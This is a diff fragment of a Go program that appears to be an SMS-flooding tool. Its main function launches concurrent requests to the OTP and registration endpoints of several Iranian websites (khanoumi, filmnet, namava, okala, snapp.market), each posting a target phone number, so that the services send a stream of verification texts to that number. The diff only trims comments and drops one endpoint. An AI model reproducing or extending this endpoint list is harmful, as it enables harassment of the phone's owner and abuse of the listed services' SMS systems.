@@ -299,19 +299,16 @@ func main() {
 		}, ch)    // add site
 		go sms("https://www.khanoumi.com/accounts/sendotp", map[string]interface{}{
 			"mobile": phone,
-		}, ch)   // dar khate 406 neveshteh shodeh.
+		}, ch)  
 		go sms("https://filmnet.ir/api-v2/access-token/users/0{phone}/otp", map[string]interface{}{
 			"otp:login": phone,
-		}, ch)   // dar khate 578 neveshteh shodeh.
+		}, ch)  
 		go sms("https://www.namava.ir/api/v1.0/accounts/registrations/by-phone/request", map[string]interface{}{
 			"UserName": phone,
-		}, ch)   // dar khate 343 va 596 neveshteh shodeh.
-		go sms("https://api.doctoreto.com/api/web/patient/v1/accounts/register", map[string]interface{}{
-			"mobile": phone,
-		}, ch)   // dar khate 618 neveshteh shodeh.
+		}, ch) 
 		go sms("https://api-react.okala.com/C/CustomerAccount/OTPRegister", map[string]interface{}{
 			"mobile": phone,
-		}, ch)   // dar khate 764 neveshteh shodeh.
+		}, ch)  
 //number3:
 		go sms("https://api.snapp.market/mart/v1/user/loginMobileWithNoPass", map[string]interface{}{
 			"cellphone": phone,
